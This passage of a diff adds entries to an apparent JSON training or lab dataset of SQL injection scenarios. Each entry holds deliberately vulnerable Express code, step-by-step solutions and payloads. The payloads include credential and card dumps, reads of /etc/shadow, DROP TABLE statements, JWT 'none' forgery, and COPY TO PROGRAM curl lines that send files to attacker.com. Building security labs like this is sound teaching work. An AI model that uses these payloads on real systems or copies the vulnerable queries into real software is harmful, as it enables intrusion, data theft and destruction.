+      "status UNION SELECT NULL,CONCAT(name,': ',address),NULL FROM customers--",
+      "id UNION SELECT NULL,pg_read_file('/etc/shadow'),NULL--"
+    ]
+  },
+  {
+    "Lab scenario": "Smart Home Controller JWT-SQLi in Device Management",
+    "Lab Description": "Device control API uses JWT claims directly in SQL queries with broken signature validation. The application executes: SELECT * FROM devices WHERE owner = '${jwt.sub}'. To solve: Forge admin JWT and takeover all smart devices.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Decode JWT using jwt.io",
+      "Modify sub claim to: ' UNION SELECT 1,'admin','*' FROM users--",
+      "Sign with 'none' algorithm",
+      "Bypass CSRF protection using CORS misconfig",
+      "Execute mass device reset command"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/devices', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM devices WHERE owner = '${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "' UNION SELECT 1,device_id,'admin' FROM devices--",
+      "'||(SELECT group_concat(password) FROM users)--"
+    ]
+  },
+  {
+    "Lab scenario": "Voting System - Error-Based SQL Injection in Poll Results",
+    "Lab Description": "An online voting application displays poll results aggregated via SQL. The `poll_id` is taken from a GET parameter and directly injected into a GROUP BY query without sanitization. By leveraging error-based SQL injection with improper type casting, an attacker can extract database names and user tables using verbose PostgreSQL error messages. This lab demonstrates how misusing numeric casting in error messages can lead to data disclosure.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Access the endpoint: /polls/results?poll_id=1",
+      "Inject: poll_id=1::int OR CAST((SELECT version()) AS int)--",
+      "Read the error message to determine database version",
+      "Enumerate tables via error extraction"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/polls/results', (req, res) => {\n  const pollId = req.query.poll_id;\n  const query = `SELECT option, COUNT(*) FROM votes WHERE poll_id = ${pollId} GROUP BY option`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "1::int OR CAST((SELECT current_user) AS int)--",
+      "1 OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--"
+    ]
+  },
+  {
+    "Lab scenario": "CRM Application - Time-Based SQL Injection in Login Form",
+    "Lab Description": "A Customer Relationship Management (CRM) application has a vulnerable login system. Although errors are suppressed, an attacker can infer SQL injection by measuring time delays. This lab uses PostgreSQL's `pg_sleep` to demonstrate blind SQL injection through the username field, allowing attackers to brute-force credentials using conditional delays.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit login form with payload: admin' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+      "Measure server response time",
+      "Automate using sqlmap: `sqlmap -u /login -p username --technique=T --delay=5`",
+      "Infer data via bitwise delay exploitation"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  pool.query(query, (err, result) => {\n    if (result && result.rows.length > 0) {\n      res.send('Login success');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});",
+    "payloads": [
+      "admin' OR 1=1--",
+      "admin' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+    ]
+  },
+  {
+    "Lab scenario": "Payment Processor - Boolean-Blind SQLi in Transaction Logs",
+    "Lab Description": "A payment platform allows filtering logs via a query string parameter. The system only returns a status of 'true' or 'false', but the backend query is injectable. Attackers can infer sensitive payment info like card digits by manipulating boolean logic within the WHERE clause and observing the true/false behavior.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Send request to /transactions/logs?filter=id=1 AND (SELECT substring(card_no,1,1)='4')",
+      "Observe whether results exist (true) or not (false)",
+      "Use binary search to extract full credit card numbers",
+      "Automate using sqlmap or custom Python scripts"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/transactions/logs', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM payments WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    res.json({ found: result.rows.length > 0 });\n  });\n});",
+    "payloads": [
+      "1=1 AND substring((SELECT card_no FROM payments LIMIT 1),1,1)='4'--",
+      "1=1 AND ascii(substring((SELECT card_no FROM payments LIMIT 1),1,1))>50--"
+    ]
+  },
+  {
+    "Lab scenario": "IoT Device Dashboard - SQLi via MQTT Message Injection",
+    "Lab Description": "IoT telemetry data sent over MQTT is processed into a PostgreSQL database. The message handler lacks proper validation, allowing SQL injection via MQTT payloads. This lab focuses on out-of-band time-based attacks and showcases how IoT protocols can become attack surfaces.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept MQTT traffic (topic: telemetry/data)",
+      "Publish payload: {'device_id': 'dev1'; SELECT pg_sleep(5)--', 'value': 20}",
+      "Measure backend delay",
+      "Extract data conditionally through timed responses"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "mqttClient.on('message', (topic, message) => {\n  const data = JSON.parse(message);\n  const query = `INSERT INTO telemetry (device_id, reading) VALUES ('${data.device_id}', ${data.value})`;\n  pool.query(query);\n});",
+    "payloads": [
+      "'; SELECT pg_sleep(5)--",
+      "'; SELECT CASE WHEN (SELECT COUNT(*) FROM devices)>0 THEN pg_sleep(5) END--"
+    ]
+  },
+  {
+    "Lab scenario": "Support Portal - Second-Order SQL Injection in Ticket System",
+    "Lab Description": "The application stores user-submitted tickets that are later used in admin SQL queries. The stored malicious data becomes effective only after a separate action triggers it, demonstrating second-order SQL injection. The attacker poisons input via the ticket submission page and waits for it to be processed in a vulnerable report generation feature.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit a ticket with subject: test'); DROP TABLE tickets;--",
+      "Wait for admin to generate daily summary",
+      "Confirm impact by observing missing records",
+      "Modify payload to exfiltrate data instead of destruction"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/submit_ticket', (req, res) => {\n  const { subject, message } = req.body;\n  const query = `INSERT INTO tickets (subject, message) VALUES ('${subject}', '${message}')`;\n  pool.query(query);\n  res.send('Ticket submitted');\n});\n\napp.get('/admin/reports', (req, res) => {\n  const query = `SELECT * FROM tickets WHERE subject LIKE '%${req.query.search}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "'); DROP TABLE tickets;--",
+      "'); INSERT INTO secrets SELECT * FROM users;--"
+    ]
+  },
+  {
+    "Lab scenario": "SaaS Analytics - SQLi in Export Feature Using Stacked Queries",
+    "Lab Description": "The export CSV feature builds a dynamic query based on filters and directly executes it. Attackers can append stacked queries using semicolons to create new tables, copy data, or trigger remote command execution (PostgreSQL COPY FROM PROGRAM). This lab simulates privilege escalation via SQLi.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Request: /export?filter=1; COPY users TO PROGRAM 'curl http://attacker.com/exfil.txt'--",
+      "Trigger the endpoint and monitor attacker server",
+      "Validate stolen credentials via crafted CSV output"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM usage WHERE ${filter}) TO STDOUT WITH CSV`;\n  pool.query(query);\n  res.send('Exported');\n});",
+    "payloads": [
+      "1; DROP TABLE usage;--",
+      "1; COPY users TO PROGRAM 'curl http://attacker.com?data=$(cat /etc/passwd)'--"
+    ]
+  },
+  {
+    "Lab scenario": "Mobile App Backend - JSON-Based SQLi via REST API",
+    "Lab Description": "A mobile app sends JSON bodies to an API endpoint that joins JSON values into SQL filters. An attacker can exploit this by inserting SQL logic within array elements, bypassing filters and leaking authentication tokens. The vulnerability stems from improper concatenation of JSON strings into SQL clauses.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Send POST to /api/filter with body: { \"filters\": [\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"] }",
+      "Check API response for token leaks",
+      "Automate with script that manipulates filter elements"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/filter', (req, res) => {\n  const filters = req.body.filters.join(' OR ');\n  const query = `SELECT * FROM users WHERE ${filters}`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"",
+      "\"1=1 OR EXISTS(SELECT * FROM users)--\""
+    ]
+  },
+  {
+    "Lab scenario": "Blog Engine - Union SQLi via Tag Search",
+    "Lab Description": "The blog application offers tag-based article filtering. Tags are concatenated into a WHERE clause with no sanitization, leading to a UNION-based SQL injection vulnerability. An attacker can extract full user records by appending a secondary query into the tag filter.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Access: /articles?tag=tech' UNION SELECT username,password FROM users--",
+      "Verify the presence of user credentials in response",
+      "Use different UNION column count if needed"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/articles', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM articles WHERE tag='${tag}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "tech' UNION SELECT username,password FROM users--",
+      "dev' OR 1=1--"
+    ]
+  },
+  {
+    "Lab scenario": "Admin Panel - SQLi via Cookie Injection",
+    "Lab Description": "The admin dashboard uses cookie-based authentication, which is parsed and inserted into a query without sanitization. A malicious user can modify their cookie value to execute SQL injection and access admin-only resources or dump data.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Set Cookie: auth=admin' OR '1'='1",
+      "Access /admin endpoint and confirm access",
+      "Use payload to UNION SELECT table names"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/admin', (req, res) => {\n  const auth = req.cookies.auth;\n  const query = `SELECT * FROM admins WHERE username='${auth}'`;\n  pool.query(query, (err, result) => {\n    if (result.rows.length > 0) {\n      res.send('Admin Access');\n    } else {\n      res.status(403).send('Access Denied');\n    }\n  });\n});",
+    "payloads": [
+      "admin' OR '1'='1--",
+      "' UNION SELECT NULL,password FROM users--"
+    ]
+  },
+  {
+    "Lab scenario": "Banking Portal UNION-Based SQLi in CSV Export Order Clause",
+    "Lab Description": "A financial report export feature in a banking portal directly concatenates user-controlled sorting parameters into an ORDER BY clause within a PostgreSQL COPY command. The application leaks verbose errors containing sensitive database metadata. Attackers can exploit this to exfiltrate account balances and transaction histories by bypassing column type checks through explicit casting and UNION payloads. The vulnerability stems from improper input sanitization and debug-mode error reporting in production.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Intercept POST /export CSV generation request using Burp Suite",
+      "2. Identify injectable 'sort' parameter: sort=amount",
+      "3. Determine column count: ' ORDER BY 7-- (Observe error at ORDER BY 8)",
+      "4. Craft payload: amount UNION SELECT NULL,CAST(balance AS TEXT),NULL,NULL,NULL,NULL FROM accounts--",
+      "5. Bypass CSV encapsulation using CHR(9) tab characters",
+      "6. Parse stolen data from corrupted CSV file headers"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort || 'date';\n  const query = `COPY (\n    SELECT id,date,amount,recipient\n    FROM transactions\n    ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n\n  pool.query(query, (err) => {\n    if(err) {\n      console.error(`Full error: ${err.stack}`); // Debug leakage\n      res.status(500).send(err.message);\n    } else {\n      res.attachment('report.csv');\n    }\n  });\n});",
+    "payloads": [
+      "amount UNION SELECT NULL,CAST(CURRENT_USER AS TEXT),NULL,NULL,NULL,NULL--",
+      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Platform JSON Array Injection with Type Confusion",
+    "Lab Description": "A product search API processes JSON arrays containing filter conditions without type validation. Attackers can bypass parameterized queries by nesting objects and exploiting SQLite's dynamic typing system. This lab demonstrates credential extraction through type juggling and JSON aggregation functions.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Set Content-Type: application/json",
+      "2. Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT json_group_array(username||':'||password) FROM users--\"}]}",
+      "3. Bypass WAF using Unicode escapes: \\u0027",
+      "4. Parse concatenated credentials from JSON response",
+      "5. Crack hashes using John the Ripper"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters\n    .map(f => `${f.field}=${f.value}`)\n    .join(' AND ');\n\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
+    "payloads": [
+      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT sqlite_version(),1,1--\"}]",
+      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT LOAD_EXTENSION('exploit.so'),NULL,NULL--\"}]"
+    ]
+  },
+  {
+    "Lab scenario": "Social Media Platform JWT-SQLi in Notifications",
+    "Lab Description": "A notification system inserts JWT 'sub' claims directly into SQL queries without validation. Attackers can forge tokens with UNION payloads to hijack user sessions and exfiltrate private messages through malformed JSON responses.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Decode JWT using jwt.io",
+      "2. Modify 'sub' to: ' UNION SELECT message,user FROM inbox--",
+      "3. Sign with 'none' algorithm",
+      "4. Bypass CSRF tokens using CORS misconfiguration",
+      "5. Parse messages from notification API response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/notifications', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM notifications WHERE user_id='${userId}'`;\n\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,CONCAT(user,':',password) FROM users--",
+      "'||(SELECT pg_read_file('/home/app/.env'))--"
+    ]
+  },
+  {
+    "Lab scenario": "Telemedicine Platform XML/SQL Polyglot Injection",
+    "Lab Description": "A patient portal processes XML input containing CDATA-wrapped SQL fragments. Attackers can bypass XML entity encoding through hybrid polyglot payloads to extract sensitive medical records using PostgreSQL's xmlagg() function.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Wrap payload in CDATA: <![CDATA[' UNION SELECT xmlagg(XMLELEMENT(...)) FROM records--]]>",
+      "2. Bypass XML validation using external entities",
+      "3. Parse exfiltrated data from malformed XML responses",
+      "4. Convert Base64-encoded results to PDF reports"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/telemed', (req, res) => {\n  const xml = req.rawBody;\n  const patientId = extractXPath(xml, '//patient/id');\n  const query = `SELECT * FROM records WHERE patient_id='${patientId}'`;\n\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
+    "payloads": [
+      "<![CDATA[' UNION SELECT xmlagg(XMLELEMENT(NAME \"data\", diagnosis)) FROM records--]]>",
+      "'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT medical_history FROM patients))--"
+    ]
+  },
+  {
+    "Lab scenario": "Smart Home Dashboard – SQLi in Device Group Aggregation",
+    "Lab Description": "The smart home admin dashboard allows users to aggregate device energy usage by group. The server-side logic dynamically builds the SQL `GROUP BY` and `ORDER BY` clauses based on user-supplied parameters. An attacker can exploit this by injecting a UNION-based payload through the group query, exfiltrating device secrets or configuration files. The vulnerability arises due to lack of input validation and direct string interpolation into SQL clauses. This mimics real-world attacks in IoT management platforms.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept the `/device/stats?group=group_name` endpoint",
+      "Inject: `1 UNION SELECT NULL, secret_key FROM device_configs--`",
+      "Observe the leaked `secret_key` values in the response",
+      "Automate using sqlmap with custom `--union-cols`"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/device/stats', (req, res) => {\n  const groupBy = req.query.group;\n  const query = `SELECT ${groupBy}, SUM(power_usage) FROM devices GROUP BY ${groupBy}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "1 UNION SELECT NULL, secret_key FROM device_configs--",
+      "1 UNION SELECT version(), NULL--"
+    ]
+  },
+  {
+    "Lab scenario": "Library Search Engine – SQLi via Boolean Conditions in Search Filter",
+    "Lab Description": "A digital library platform allows users to search books using various filters including author and genre. The search input is vulnerable to Boolean-based blind SQL injection due to its dynamic usage in the `WHERE` clause without sanitization. By leveraging timing functions such as `pg_sleep` or `SLEEP`, an attacker can enumerate database content even when no output is directly returned. The challenge highlights data inference via blind channels and can simulate real-world research archive systems.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Send POST request to `/search` with `{ \"filter\": \"author='Alice' AND 1=1\" }`",
+      "Modify payload: `author='Alice' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users LIMIT 1))>5 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
+      "Measure response delay to infer password length",
+      "Automate extraction with a binary search loop"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM books WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Invalid filter\");\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "author='admin' AND 1=1--",
+      "author='admin' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
+    ]
+  },
+  {
+    "Lab scenario": "Insurance Claim Portal – SQLi in Policy ID Lookup",
+    "Lab Description": "An insurance web portal allows users to track claim status by providing a policy ID. The policy ID is directly concatenated into a SQL `WHERE` clause without proper escaping. This enables classic SQL injection attacks, allowing attackers to enumerate policy details, retrieve confidential claim attachments, and bypass access controls. This scenario mimics legacy financial services APIs that rely on ID-based filtering.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit request to `/claims?policy_id=123`",
+      "Inject: `123 OR 1=1--` to list all claims",
+      "Use UNION to access additional tables: `123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--`",
+      "Dump sensitive data from the response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/claims', (req, res) => {\n  const policyId = req.query.policy_id;\n  const query = `SELECT * FROM claims WHERE policy_id=${policyId}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Query failed\");\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "123 OR 1=1--",
+      "123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--"
+    ]
+  },
+  {
+    "Lab scenario": "Online Education Platform – SQLi via Feedback System",
+    "Lab Description": "The course feedback system in a university's e-learning portal is vulnerable to stacked SQL injection. When students submit feedback, the comments are concatenated into a SQL statement used in administrative analysis reports. A malicious student can exploit this by submitting a comment that injects multiple SQL statements, enabling unauthorized access to staff tables or privilege escalation. The lab simulates real-world educational platforms that rely on weak report generators.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Register as a student and submit feedback",
+      "Inject comment: `Nice course'; DROP TABLE students;--`",
+      "Observe server-side error and dropped tables",
+      "Refine payload for exfiltration: `Great!'; COPY users TO PROGRAM 'curl http://attacker.com/$(cat /etc/passwd)'--`"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/feedback', (req, res) => {\n  const comment = req.body.comment;\n  const courseId = req.body.course_id;\n  const query = `INSERT INTO feedback (course_id, comment) VALUES (${courseId}, '${comment}')`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Failed to record feedback\");\n    res.send(\"Thank you for your feedback\");\n  });\n});",
+    "payloads": [
+      "Nice course'; DROP TABLE students;--",
+      "Cool!'; COPY users TO PROGRAM 'curl http://attacker.com/$(whoami)'--"
+    ]
+  },
+  {
+    "Lab scenario": "Medical Record App – SQLi in Filtered Lab Test Results",
+    "Lab Description": "A hospital management system provides an endpoint for querying lab test results filtered by test type. The SQL query uses the user input in a dynamic string with no validation, making it vulnerable to error-based SQL injection. The attacker can leverage PostgreSQL's error reporting to infer the structure of underlying tables and extract lab results or patient identifiers. This scenario is based on actual flaws seen in healthcare reporting interfaces.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Access `/results?test_type=blood`",
+      "Inject: `blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--`",
+      "Review server errors exposing schema names",
+      "Use error leakage to extract fields like `ssn`, `diagnosis`, etc."
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/results', (req, res) => {\n  const testType = req.query.test_type;\n  const query = `SELECT * FROM tests WHERE type='${testType}'`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
+      "urine' OR 1=1--"
+    ]
+  },
+  {
+    "Lab scenario": "Retail Chain API – SQLi via Internal Analytics Dashboard",
+    "Lab Description": "A retail chain's internal dashboard accepts analytics queries via a web UI, where filter strings are passed to a SQL backend. Due to weak validation, attackers can inject time-based SQL payloads to exfiltrate sensitive inventory and sales data, especially when UNION-based methods are blocked. The attack vector uses PostgreSQL's `pg_sleep` and conditional subqueries, ideal for time-based inference.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit payload: `region='West' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT name FROM products LIMIT 1),1,1))>77 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
+      "Measure response delays using curl and bash",
+      "Extract product names character by character"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/analytics', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM analytics WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Bad filter\");\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "region='East' AND 1=1--",
+      "region='West' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(3) END)--"
+    ]
+  },
+  {
+    "Lab scenario": "University Login Panel – SQLi Bypass via Cookie Manipulation",
+    "Lab Description": "The login system of a university portal relies on a user-supplied `auth_token` cookie, which is directly included in a SQL query. An attacker can forge the token to include a SQLi payload, bypassing authentication checks. This lab simulates real-world flaws in legacy systems where session data is not validated cryptographically.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Modify cookie: `auth_token=admin'--`",
+      "Access restricted area via forged token",
+      "Use UNION to fetch admin password hash: `admin' UNION SELECT password FROM users WHERE role='admin'--`"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/dashboard', (req, res) => {\n  const token = req.cookies.auth_token;\n  const query = `SELECT * FROM sessions WHERE token='${token}'`;\n  pool.query(query, (err, result) => {\n    if (err || result.rows.length === 0) return res.status(403).send(\"Access denied\");\n    res.send(\"Welcome back!\");\n  });\n});",
+    "payloads": [
+      "admin'--",
+      "admin' UNION SELECT password FROM users WHERE username='admin'--"
+    ]
+  },
+  {
+    "Lab scenario": "Internal Admin Panel – SQLi in Role Assignment",
+    "Lab Description": "An internal admin panel allows assigning roles to users through a vulnerable SQL query concatenated with user-controlled input. The input is directly passed to the SQL `UPDATE` query without proper sanitization. An attacker with limited access can escalate privileges by injecting into the role assignment input field. This scenario simulates a common misconfiguration where admin interfaces are assumed safe and are poorly validated.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Login as a low-privileged user with access to the role assignment interface",
+      "Capture the POST request to `/admin/assign-role`",
+      "Modify the `username` parameter to inject: `john'; UPDATE users SET role='admin' WHERE username='attacker`",
+      "Observe successful privilege escalation by logging out and back in as `attacker`"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/admin/assign-role', (req, res) => {\n  const username = req.body.username;\n  const role = req.body.role;\n  const sql = `UPDATE users SET role='${role}' WHERE username='${username}'`;\n  db.query(sql, (err) => {\n    if (err) return res.status(500).send('Database error');\n    res.send('Role updated');\n  });\n});",
+    "payloads": [
+      "john'; UPDATE users SET role='admin' WHERE username='attacker",
+      "admin'; DROP TABLE logs;--"
+    ]
+  },
+  {
+    "Lab scenario": "Payment History Portal – SQLi in Dynamic Column Filter",
+    "Lab Description": "The application backend allows users to search their payment history by various columns like `amount`, `status`, or `method`. The filter column name is user-controlled and directly used in the SQL query, leading to a classic SQLi vulnerability through the `ORDER BY` clause. An attacker can exploit this to inject malicious SQL and dump the full transaction history or manipulate sorting logic.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture a GET request to `/payments?sort=amount`",
+      "Inject payload: `1; SELECT version();--` in the `sort` parameter",
+      "Use UNION-based injection to retrieve transaction secrets or configuration info",
+      "Use pg_sleep for time-based confirmation if blind"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/payments', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results);\n  });\n});",
+    "payloads": [
+      "amount; SELECT pg_sleep(5)--",
+      "id; DROP TABLE transactions--"
+    ]
+  },
+  {
+    "Lab scenario": "NGO Donor Portal – SQLi via Search Field with LIKE",
+    "Lab Description": "The NGO's donation search feature is vulnerable due to unsanitized use of user input in a `LIKE` clause. Attackers can inject SQL using special characters and extract sensitive donor information such as email addresses, donation amount, and messages. This is a common real-world vulnerability due to poor filter design in keyword searches.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Send GET request: `/search?q=%' OR 1=1--`",
+      "Use UNION to select data from `donors` table",
+      "Use boolean-based blind SQLi to extract field-by-field info",
+      "Automate the exploit using sqlmap"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT * FROM donations WHERE message LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
+    "payloads": [
+      "%' OR 1=1--",
+      "%' UNION SELECT null,email,null FROM donors--"
+    ]
+  },
+  {
+    "Lab scenario": "GraphQL Backend – SQL Injection in Resolver Function",
+    "Lab Description": "A GraphQL resolver directly includes user input from a search query in the SQL statement, making it vulnerable to SQL injection. The injection point is in the GraphQL `searchProducts(term: String)` operation. Exploiting this can lead to arbitrary SQL execution and access to sensitive product inventory details.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft a GraphQL query with a malicious `term` parameter",
+      "Inject: `'; DROP TABLE inventory;--` or UNION injections",
+      "Send request via GraphQL playground or API client",
+      "Retrieve sensitive data from inventory or logs"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const resolvers = {\n  Query: {\n    searchProducts: async (_, { term }) => {\n      const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n      return await db.query(sql);\n    }\n  }\n};",
+    "payloads": [
+      "'; DROP TABLE inventory;--",
+      "' UNION SELECT credit_card FROM payments--"
+    ]
+  },
+  {
+    "Lab scenario": "Travel Booking – SQLi in Country Filter with Enumeration",
+    "Lab Description": "This application lets users filter travel packages by country. However, the country parameter is unsanitized and directly included in the SQL query. This allows attackers to enumerate packages in other users’ accounts by bypassing country-level access control using injection in the filter parameter.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Send GET request to `/packages?country=Italy`",
+      "Inject: `Italy' OR 1=1--` to bypass country filter",
+      "Use UNION to join with customer table",
+      "Dump names and emails using crafted payloads"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/packages', (req, res) => {\n  const country = req.query.country;\n  const sql = `SELECT * FROM travel_packages WHERE country='${country}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Error fetching packages');\n    else res.json(rows);\n  });\n});",
+    "payloads": [
+      "Italy' OR 1=1--",
+      "France' UNION SELECT name,email FROM users--"
+    ]
+  },
+  {
+    "Lab scenario": "Cloud Service – SQL Injection in API Key Authorization",
+    "Lab Description": "A cloud service uses a weak implementation for API key lookup. It concatenates the `x-api-key` header value directly into a query. A malicious actor could modify the header and extract data from other tenants’ records or even bypass authentication altogether.",
+    "Difficulty Level": "High",
+    "Solution Steps": [
+      "Send a GET request with crafted header: `x-api-key: key123' OR 1=1--`",
+      "Access unauthorized resources via API response",
+      "Test error-based injection to extract schema info",
+      "Use time-based injection if output is blind"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/data', (req, res) => {\n  const apiKey = req.headers['x-api-key'];\n  const sql = `SELECT * FROM clients WHERE api_key='${apiKey}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(401).send('Invalid key');\n    else res.json(rows);\n  });\n});",
+    "payloads": [
+      "key123' OR 1=1--",
+      "key123' UNION SELECT password FROM users--"
+    ]
+  },
+  {
+    "Lab scenario": "Employee Portal – SQL Injection in Login Field",
+    "Lab Description": "The login form for internal employee authentication takes the username and password and embeds them directly into a SQL query. There is no use of prepared statements or sanitization, making it highly vulnerable. This classic injection can be used to bypass login and access internal records.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Enter `' OR '1'='1` as username and anything as password",
+      "Observe login success without valid credentials",
+      "Use UNION to extract employee emails from database"
+    ],
+    "Vulnerability name": "SQL injection",
